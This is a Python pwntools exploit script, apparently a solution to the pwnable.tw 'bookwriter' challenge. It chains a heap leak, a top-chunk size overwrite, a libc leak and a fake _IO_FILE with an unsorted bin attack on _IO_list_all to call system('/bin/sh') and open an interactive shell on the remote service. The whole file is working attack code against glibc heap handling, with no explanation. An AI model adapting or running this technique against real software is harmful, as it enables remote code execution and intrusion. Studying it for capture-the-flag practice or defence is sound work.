#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./bookwriter"
libcPath = "./libc_64.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10304

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    libc.sym['main_arena'] = 0x3c4b20

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)
    libc.sym['main_arena'] = 0x3c3b20

#  context.log_level = "debug"
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    info("leak heap -> {:#x}".format(0x400C31))
    info("edit -> {:#x}".format(0x400BAD))
    info("malloc -> {:#x}".format(0x4009FB))
    info("leak libc -> {:#x}".format(0x400B1F))
    raw_input("DEBUG: ")

def add(size, cont, fini = False):
    io.sendlineafter("choice :", "1")
    io.sendlineafter("page :", str(size))
    if fini == False:
        io.sendafter("Content :", cont)

def view(idx):
    io.sendlineafter("choice :", "2")
    io.sendlineafter("page :", str(idx))

def edit(idx, cont):
    io.sendlineafter("choice :", "3")
    io.sendlineafter("page :", str(idx))
    io.sendafter("Content:", cont)

def information():
    io.sendlineafter("choice :", "4")
    io.recvuntil('0' * 0x40)
    heapbase = u64(io.recvline().strip().ljust(8, '\0')) - 0x10
    success("heap", heapbase)
    io.sendlineafter("no:0) ", "0")
    return heapbase


#  if __name__ == "__main__":
with context.quiet:
    io.sendafter("Author :", '0' * 0x40)
    add(0x18, '0' * 0x18)

    edit(0, '1' * 0x18)
    edit(0, '2' * 0x18 + '\xe1' + '\x0f' + '\0')
    heapbase = information()

    for i in xrange(7):
        add(0x18, str(i) * 8)
    edit(0, '\0')
    add(0x18, 'x' * 0x18) # overflow

    view(1)
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 1640 - libc.sym['main_arena']
    success("libc", libc.address)

    fake_file = flat("/bin/sh\0", 0x61) # _flags; smallbin
    fake_file += flat(0, libc.sym['_IO_list_all'] - 0x10) # unsorted bin attack
    fake_file += flat(0, 1) # _IO_write_base; _IO_write_ptr
    fake_file = fake_file.ljust(0xc0, '\0')
    fake_file += p64(0) # _mode
    fake_file = fake_file.ljust(0xd8, '\0')
    fake_file += p64(heapbase)

    vtable = flat(0, libc.sym['system'])

    payload = fit({0x0: vtable, 0x110: fake_file}, filler = '\0')

    #  DEBUG()
    edit(0, payload)
    add(0x10, 'getshell', True)
   
    io.interactive()
